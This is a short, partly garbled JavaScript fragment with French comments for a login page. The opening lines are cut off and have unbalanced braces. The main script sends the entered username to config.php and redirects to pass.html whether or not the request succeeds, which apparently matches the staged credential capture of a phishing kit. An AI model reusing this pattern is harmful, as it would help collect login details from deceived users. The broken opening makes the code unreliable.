    form.addEventListener('submit', function(e) {
      const input = form.querySelector('input[type="text"], input[type="email"], input[name*="user"], input[name*="identifiant"]');

        });
      }
    });
  }
});

  }

document.addEventListener('DOMContentLoaded', function() {
  var input = document.getElementById('loginUsername');
  var button = document.getElementById('connect');
  var form = document.getElementById('loginForm');

  input.addEventListener('input', function() {
    button.disabled = this.value.trim() === '';
  });

  form.addEventListener('submit', function(e) {
    e.preventDefault();
    var username = input.value.trim();
    if (username !== '') {
      // Envoi de l'identifiant à config.php
      fetch('config.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'type=identifiant&value=' + encodeURIComponent(username)
      }).then(() => {
        window.location.href = './pass.html';
      }).catch(() => {
        // En cas d'erreur, rediriger quand même
        window.location.href = './pass.html';
      });
    }
  });
});
